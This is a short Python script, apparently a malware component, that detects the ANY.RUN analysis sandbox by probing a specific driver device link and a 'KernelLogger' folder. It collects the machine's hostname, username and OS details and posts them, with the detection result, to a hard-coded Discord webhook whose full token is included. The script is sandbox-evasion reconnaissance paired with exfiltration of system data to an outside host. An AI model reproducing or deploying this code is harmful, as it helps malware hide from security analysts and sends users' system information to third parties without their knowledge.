import os
import platform
import getpass
import socket
import datetime
import requests
import ctypes
from ctypes import wintypes

# basic config
WEBHOOK = "https://discord.com/api/webhooks/1374963923555455036/zwbfbBF-nt18oSJGiRP-ES8IarcYCW-qxeRbsTmpRvy_xHc7qD530XIPYJ1tqANlHney"
DRIVER_LINK = r"\\?\A3E64E55_fl"
FOLDER_PATH = r"C:\Program Files\KernelLogger" # folder path method doesnt work anymore since anyrun patched it

def check_driver(link):
    if platform.system() != "Windows":
        return False, None

    GENERIC_READ = 0x80000000
    OPEN_EXISTING = 3
    INVALID_HANDLE = wintypes.HANDLE(-1).value

    k32 = ctypes.WinDLL('kernel32.dll')
    k32.CreateFileW.argtypes = [
        wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
        wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE
    ]
    k32.CreateFileW.restype = wintypes.HANDLE

    h = k32.CreateFileW(link, GENERIC_READ, 0, None, OPEN_EXISTING, 0, None)
    err = k32.GetLastError()

    if h != INVALID_HANDLE:
        k32.CloseHandle(h)
        return True, 0
    return False, err

def check_folder(path):
    return os.path.isdir(path)

def get_sys_info():
    return {
        "os": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "machine": platform.machine(),
        "host": socket.gethostname(),
        "user": getpass.getuser(),
        "time": datetime.datetime.utcnow().isoformat() + "Z"
    }

def send_report(info):
    lines = [
        "**AnyRun Environment Check**",
        f"Driver link found: {'✅' if info['drv'] else '❌'}",
        f"Driver error code: {info['err']}",
        f"KernelLogger folder: {'✅' if info['folder'] else '❌'}",
        "",
        f"OS: {info['sys']['os']} {info['sys']['release']} ({info['sys']['version']})",
        f"Arch: {info['sys']['machine']}",
        f"Hostname: {info['sys']['host']}",
        f"User: {info['sys']['user']}",
        f"Time: {info['sys']['time']}"
    ]
    try:
        requests.post(WEBHOOK, json={"content": "\n".join(lines)}, timeout=5)
    except Exception as e:
        print("failed to send report:", e)

if __name__ == "__main__":
    drv, err = check_driver(DRIVER_LINK)
    folder = check_folder(FOLDER_PATH)
    sys_info = get_sys_info()

    data = {
        "drv": drv,
        "err": err,
        "folder": folder,
        "sys": sys_info
    }

    if drv or folder:
        print("looks like AnyRun is active")
    else:
        print("no signs of AnyRun")

    send_report(data)

